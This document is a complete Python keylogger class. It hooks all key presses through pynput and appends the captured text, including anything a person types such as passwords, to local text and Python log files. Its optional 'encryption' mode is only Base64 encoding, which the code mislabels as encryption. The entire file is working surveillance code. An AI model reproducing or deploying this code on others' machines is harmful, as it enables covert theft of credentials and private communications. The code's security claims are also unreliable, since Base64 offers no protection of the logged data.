import pynput.keyboard
import threading
import time
import os
import base64
from datetime import datetime

class Keylogger:
    def __init__(self, log_dir="logs"):
        self.log_dir = log_dir
        self.log_txt_path = os.path.join(log_dir, "keylog.txt")
        self.log_py_path = os.path.join(log_dir, "keylog.py")
        self.log = ""
        self.is_running = False
        self.is_encrypted = False  # Feature: Encryption Support
        self.listener = None
        
        if not os.path.exists(log_dir):
            os.makedirs(log_dir)

    def set_encryption(self, enabled):
        self.is_encrypted = enabled

    def append_to_log(self, key):
        # --- Logic Refinement: Clean Up Logs ---
        
        # 1. Handle Backspace (Log it explicitly since we save immediately)
        if key == pynput.keyboard.Key.backspace:
            self.log += " [BACKSPACE] "
            return

        # 2. Handle Tab (Add natural spacing)
        if key == pynput.keyboard.Key.tab:
            self.log += "\t"
            return

        # 3. Ignore Keys (Modifiers & System Keys)
        ignore_keys = {
            pynput.keyboard.Key.shift, pynput.keyboard.Key.shift_r,
            pynput.keyboard.Key.ctrl_l, pynput.keyboard.Key.ctrl_r,
            pynput.keyboard.Key.alt_l, pynput.keyboard.Key.alt_gr,
            pynput.keyboard.Key.caps_lock,
            pynput.keyboard.Key.cmd, pynput.keyboard.Key.cmd_r,
            pynput.keyboard.Key.esc
        }
        if key in ignore_keys:
            return

        # 4. Standard Character Handling
        try:
            # FIX: Check if char is not None to avoid NoneType/AttributeError
            if hasattr(key, 'char') and key.char is not None:
                self.log += str(key.char)
            else:
                raise AttributeError
        except AttributeError:
            if key == pynput.keyboard.Key.space:
                self.log += " "
            elif key == pynput.keyboard.Key.enter:
                self.log += "\n"
            else:
                # Log other special keys like F1, Insert in brackets
                self.log += " [" + str(key).replace("Key.", "") + "] "

    def process_key_press(self, key):
        self.append_to_log(key)
        # Only save if there is content to write
        if self.log: 
            self.save_to_files()

    def save_to_files(self):
        log_content = self.log
        
        if self.is_encrypted:
            # Simple obfuscation using Base64
            encoded_bytes = base64.b64encode(log_content.encode('utf-8'))
            log_content = f"[ENCRYPTED] {encoded_bytes.decode('utf-8')}"

        # Save as TXT
        with open(self.log_txt_path, "a", encoding="utf-8") as f:
            f.write(log_content)
        
        # Save as PY
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        suffix = "_ENC" if self.is_encrypted else ""
        # FIX: Use high-precision time for variable name to avoid collisions
        unique_var_id = str(time.time()).replace('.', '_')
        py_content = f"\n# Logged at {timestamp} {suffix}\nlog_data_{unique_var_id} = \"\"\"{log_content}\"\"\"\n"
        
        with open(self.log_py_path, "a", encoding="utf-8") as f:
            f.write(py_content)

        # Clear memory buffer after save
        self.log = ""

    def start(self):
        if not self.is_running:
            self.is_running = True
            self.listener = pynput.keyboard.Listener(on_press=self.process_key_press)
            self.listener.start()

    def stop(self):
        if self.is_running:
            self.is_running = False
            if self.listener:
                self.listener.stop()
                self.listener = None
            if self.log: # Ensure final buffer is saved
                self.save_to_files()
